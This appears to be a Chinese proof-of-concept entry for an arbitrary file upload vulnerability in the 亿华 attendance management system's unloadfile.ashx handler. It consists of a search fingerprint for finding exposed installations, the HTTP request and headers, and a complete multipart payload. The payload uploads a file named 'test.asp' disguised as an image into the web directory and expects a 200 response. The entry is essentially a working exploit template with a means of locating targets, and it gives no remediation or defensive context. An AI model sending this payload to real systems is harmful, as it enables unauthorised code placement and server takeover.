# 亿华考勤管理系统unloadfile.ashx存在任意文件上传漏洞

- **系统**：亿华考勤管理系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="亿华人力资源管理系统"`
- **请求**：`POST /handle/unloadfile.ashx HTTP/1.1`
- **关键头**：`X-Requested-With: XMLHttpRequest`　`Content-Type: multipart/form-data; boundary=---------------------------sad…`

**请求体 / payload**
```
-----------------------------sadasd897729dhwaiuhqqwe123
Content-Disposition: form-data; name="file"; filename="test.asp"
Content-Type: image/jpeg
test
-----------------------------sadasd897729dhwaiuhqqwe123
Content-Disposition: form-data; name="action"
unloadfile
-----------------------------sadasd897729dhwaiuhqqwe123
Content-Disposition: form-data; name="filepath"
./
-----------------------------sadasd897729dhwaiuhqqwe123—
```
- **预期**：200　|　—